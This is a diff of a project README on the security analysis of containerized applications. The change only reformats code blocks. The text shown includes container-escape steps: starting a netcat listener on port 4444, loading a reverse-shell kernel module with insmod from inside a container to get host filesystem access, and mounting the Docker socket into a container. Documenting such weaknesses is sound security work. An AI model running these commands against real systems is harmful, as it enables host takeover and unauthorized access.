@@ -44,9 +44,10 @@ This aim for this project is to conduct a Security Analysis of Containerized App
   nc -nlvp 4444
   ```
 7. Inside the Container shell of Step 3 write the Kernel Module into the Kernel Space using the command:
-  ```bash
-  insmod reverseshell_module.ko
-  ```
+
+   ```bash
+   insmod reverseshell_module.ko
+   ```
 **Result**
 
 > Upon following the above a Shell session of the Host File System mounted on the root directory is received on the Port listener. This even provides privileges to access, read and modify files through the reverse shell session. This can be classified as a high level vulnerability.
@@ -60,6 +61,7 @@ This aim for this project is to conduct a Security Analysis of Containerized App
 **Step**
 
 1. Start a Docker Container mounted on the Docker socket file at `/var/run/docker.sock` using the command:
+
    ```bash
     docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
    ```
